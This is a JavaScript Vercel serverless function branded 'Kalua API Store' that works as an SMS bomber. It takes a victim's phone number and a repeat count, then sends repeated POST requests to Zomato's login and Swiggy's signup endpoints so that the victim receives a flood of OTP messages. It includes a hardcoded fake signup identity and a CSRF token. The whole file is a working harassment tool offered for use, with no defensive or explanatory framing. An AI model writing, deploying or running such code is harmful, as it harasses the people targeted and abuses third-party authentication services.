const axios = require('axios');

// ============================================================
// 🔥 3D PREMIUM ULTRA SMS ENDPOINTS - KALUA API STORE
// ============================================================
const ENDPOINTS = [
  {
    method: 'POST',
    url: 'https://www.zomato.com/webroutes/auth/login',
    headers: {
      'Host': 'www.zomato.com',
      'Content-Type': 'application/json',
      'Origin': 'https://www.zomato.com'
    },
    data: (number) => ({ country_id: 1, phone: number, verification_type: 'sms', method: 'phone' })
  },
  {
    method: 'POST',
    url: 'https://www.swiggy.com/mapi/auth/signup',
    headers: {
      'Host': 'www.swiggy.com',
      'Origin': 'https://www.swiggy.com',
      'Content-Type': 'application/json'
    },
    data: (number) => ({ name: 'Kalua Store', email: 'kaluaapi@gmail.com', password: 'SecurePassword@123', mobile: number, _csrf: 'jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk' })
  }
];

// ============================================================
// 💎 PROFESSIONAL VERCEL HANDLER (BRANDED: KALUA API STORE)
// ============================================================
module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({
      creator: "KaluaApiAdmin",
      channel: "@KaluaApiStore",
      error: 'Method not allowed. Please use POST request.'
    });
  }

  const { number, count = 1 } = req.body || {};

  if (!number) {
    return res.status(400).json({
      creator: "KaluaApiAdmin",
      channel: "@KaluaApiStore",
      error: 'Missing target "number" parameter.'
    });
  }

  const cleanNumber = String(number).replace(/\D/g, '');
  if (cleanNumber.length < 10 || cleanNumber.length > 15) {
    return res.status(400).json({
      creator: "KaluaApiAdmin",
      channel: "@KaluaApiStore",
      error: 'Invalid phone number format. Must be 10 to 15 digits.'
    });
  }

  const totalRequests = Math.min(Number(count) || 1, 10);
  let successCount = 0;
  let failedCount = 0;
  const details = [];

  const tasks = [];
  for (let i = 0; i < totalRequests; i++) {
    for (const endpoint of ENDPOINTS) {
      tasks.push(sendRequest(endpoint, cleanNumber));
    }
  }

  const responses = await Promise.allSettled(tasks);

  for (const r of responses) {
    if (r.status === 'fulfilled') {
      successCount++;
      details.push({ status: 'success', url: r.value.url });
    } else {
      failedCount++;
      details.push({ status: 'failed', error: r.reason });
    }
  }

  return res.status(200).json({
    status: 'True',
    brand: 'KaluaApiStore',
    admin: 'KaluaApiAdmin',
    target: cleanNumber,
    total_attempts: tasks.length,
    success: successCount,
    failed: failedCount,
    message: '🚀 API executed successfully!'
  });
};

async function sendRequest(endpoint, number) {
  try {
    let url = endpoint.url;
    if (typeof url === 'function') url = url(number);

    let data = endpoint.data;
    if (typeof data === 'function') data = data(number);

    const config = {
      method: endpoint.method || 'POST',
      url,
      headers: endpoint.headers || {},
      timeout: 4000,
    };

    if (config.method !== 'GET' && data) {
      config.data = data;
    }

    const response = await axios(config);
    return { url, status: response.status };
  } catch (error) {
    throw { url: endpoint.url, error: error.message };
  }
}
